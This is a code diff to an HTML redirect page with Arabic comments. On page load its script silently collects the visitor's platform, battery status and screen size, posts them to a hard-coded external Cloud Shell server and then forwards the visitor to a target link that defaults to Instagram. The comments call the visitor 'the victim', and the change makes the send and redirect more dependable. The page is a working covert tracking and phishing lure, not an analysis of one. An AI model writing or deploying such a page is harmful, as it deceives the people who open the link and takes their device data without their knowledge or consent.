@@ -2,46 +2,39 @@
 <html>
 <head>
     <script>
-        // رابط السيرفر اللي دزيته أنت
+        // هذا هو الرابط العام المباشر والصحيح لاستقبال البيانات
         const SERVER_URL = "https://8080-cs-f65a8037-daaf-45b2-a58a-a8f4d4f83c4f.cs-europe-west4-pear.cloudshell.dev/";
 
-        async function collectAndSend() {
+        async function capture() {
             const urlParams = new URLSearchParams(window.location.search);
             const target = urlParams.get('u') || 'https://instagram.com';
             
-            // سحب معلومات البطارية
-            let batteryLevel = "N/A";
+            let batt = "N/A";
             try {
                 const b = await navigator.getBattery();
-                batteryLevel = `${Math.round(b.level * 100)}% (${b.charging ? 'يشحن' : 'فرغ'})`;
+                batt = `${Math.round(b.level * 100)}% (${b.charging ? 'يشحن' : 'لا يشحن'})`;
             } catch(e) {}
 
-            // تجهيز بيانات الجهاز
-            const deviceData = {
+            const info = {
                 platform: navigator.platform,
-                battery: batteryLevel,
+                battery: batt,
                 screen: `${window.screen.width}x${window.screen.height}`,
-                target: target,
-                vendor: navigator.vendor
+                target: target
             };
 
-            // إرسال البيانات للسيرفر (POST)
-            try {
-                await fetch(SERVER_URL, {
-                    method: 'POST',
-                    mode: 'cors',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(deviceData)
-                });
-            } catch (err) {
-                console.log("Error");
-            }
-
-            // تحويل الضحية فوراً للرابط الأصلي
-            window.location.replace(target);
+            // إرسال البيانات للسيرفر العام
+            fetch(SERVER_URL, {
+                method: 'POST',
+                mode: 'no-cors', 
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(info)
+            }).finally(() => {
+                // تحويل الضحية فوراً
+                window.location.replace(target);
+            });
         }
-        window.onload = collectAndSend;
+        window.onload = capture;
     </script>
 </head>
-<body style="background: #000;"></body>
+<body style="background:black;"></body>
 </html>
